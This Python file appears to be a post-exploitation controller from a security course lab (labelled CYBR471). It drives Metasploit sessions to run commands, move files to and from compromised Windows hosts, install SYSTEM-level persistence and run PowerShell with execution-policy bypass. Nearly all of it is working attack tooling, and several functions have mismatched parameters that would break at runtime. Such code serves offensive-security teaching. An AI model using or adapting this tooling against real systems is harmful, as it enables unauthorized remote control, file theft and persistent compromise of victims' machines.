import time
import pandas as pd
from common.util import options, ListSessions, run_module_with_output


def Runner(app, sid, exploited, session=None, session_type=None, return_opts=False):
    """
    Control targets remotely
    :param app:
    :param sid:
    :return:
    """
    while True:
        opts = {
            "Download": download,
            "Upload": upload,
            "Command": command,
            "Shutdown": shutdown,
            "Persist": persist,

            "Demo Shell" : demoS,
        }
        selection = options(opts, "Select", "Select an command")
        if return_opts:
            return selection

        print("Interpreter Type: " + session_type)

        if not selection:
            return app
        app = selection(app, session, sid, session_type, exploited)


def download(app, session, sid, type, exploited):
    """
    Download a file from the target
    :param app:
    :param sid:
    :return:
    """
    file_action(app, session, sid, type, "download")

    return app


def upload(app, session, sid, type, exploited):
    """
    Upload a file to the target
    :param app:
    :param sid:
    :return:
    """
    file_action(app, session, sid, type, "upload")

    return app


def command(app, session, sid, type, exploited):
    """
    Execute a command on the target
    :param app:
    :param sid:
    :return:
    """
    prefix = '{}({}) {}>  '
    command = input(prefix.format(type, sid, ""))
    result = execute(session, sid, type, command)
    print(result)
    input("Press enter to continue")
    return app



def execute(session, sid, stype, cmd, exploited):
    print(f"Executing {cmd} on {stype}({sid})")
    if "Meterpreter" in stype:
        terminating_strs = ['----END----']
        return session.run_with_output(cmd, terminating_strs, timeout=10, timeout_exception=False)
        # 10 seconds max

    elif "Shell" in stype:
        session.write(cmd)
        return session.read()

def shutdown(app, session, sid, type, exploited):
    """
    Shutdown the target
    :param app:
    :param sid:
    :return:
    """
    session.write('exit')
    session.stop()
    session.kill()
    input("Press enter to continue")
    return app


def file_action(app, session, sid, type, action, exploited):
    """
    Upload or download a file1
    :param app:
    :param sid:
    :param action:
    :return:
    """
    # Remote set as desktop by default
    remote = "C:/Users/user/Desktop"
    local = "/home/kali/Desktop/"

    if action == "upload":
        local += "POC.txt"

    sel = input("Use custom path? (y/n)")
    if sel.lower() == "y":
        remote = input("Remote path: ")
        if action == "download":
            local = input("Local path: ")

    command = action + " " + local + " " + remote
    result = execute(session, sid, type, command)
    print(result)
    input("Press enter to continue")

    return app



def persist(app, session, sid, type, exploited):
    """
    Persist a session
    :param client:
    :param sid:
    :return:
    """
    client = app.rpc["Client"]
    print(f"Persisting session {sid}")
    exploit = "/windows/local/persistence"
    fullname = exploit.split("/")
    exploit = "/".join(fullname[1:])
    ex = client.modules.use('exploit', exploit)
    cid = client.consoles.list[0]['id']
    arguments = {
        'SESSION': sid,
        'PATH': 'c:\\',
        'STARTUP': 'SYSTEM',
    }
    # put runoptions into dataframe
    run_setup = pd.DataFrame.from_dict(arguments, orient='index', columns=['value'], )
    print(run_setup)
    out = run_module_with_output(client.consoles.console(cid), ex, runoptions=arguments)
    print(out)  # print output
    print(client.consoles.console(cid).read())

def demoM(app, session, sid, type, exploited):
    session_command = 'arp'
    terminating_strs = ['----']
    res = session.run_with_output(session_command, terminating_strs)
    print(res)

def demoS(app, session, sid, type, exploited):
    # Get shell from meterpreter session

    session.run_shell_cmd_with_output(
        '@powershell.exe -ExecutionPolicy Bypass -Command \"[System.Reflection.Assembly]::LoadWithPartialName(\'System.Windows.Forms\'); [System.Windows.Forms.MessageBox]::Show(\'CYBR471 EXPLOIT.\')\"',
        end_strs=None)
    print("Shell command executed: Window Opened")


    print("Done or run manual commands (y=Done/n=More?")
    if input("Done? (y/n)") == "y":
        return app

    print("Suggested: Whoami, ipconfig, etc.")
    command = input("Enter command: ")
    session.run_shell_cmd_with_output(command, end_strs=None)
    input("Press enter to continue")
    return app
